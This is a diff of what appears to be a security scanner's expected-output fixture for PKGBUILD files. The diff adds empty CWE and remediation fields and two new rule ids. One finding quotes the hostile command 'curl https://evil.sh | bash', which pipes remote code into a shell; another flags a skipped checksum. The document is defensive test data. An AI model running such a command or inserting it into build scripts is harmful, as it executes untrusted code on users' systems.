@@ -374,10 +374,12 @@
     "file_changes": [],
     "findings": [
       {
+        "cwe": null,
         "description": "curl https://evil.sh | bash",
         "evidence": {},
         "file": "PKGBUILD",
         "line": 12,
+        "remediation": null,
         "rule_id": "R001",
         "rule_uid": "TS-0166",
         "severity": "CRITICAL",
@@ -385,10 +387,12 @@
         "template": ""
       },
       {
+        "cwe": null,
         "description": "checksum set to SKIP",
         "evidence": {},
         "file": "",
         "line": null,
+        "remediation": null,
         "rule_id": "H001",
         "rule_uid": "TS-0057",
         "severity": "HIGH",
@@ -438,6 +442,8 @@
     "A008",
     "A009",
     "A010",
+    "A014",
+    "A015",
     "C001",
     "C002",
     "C003",
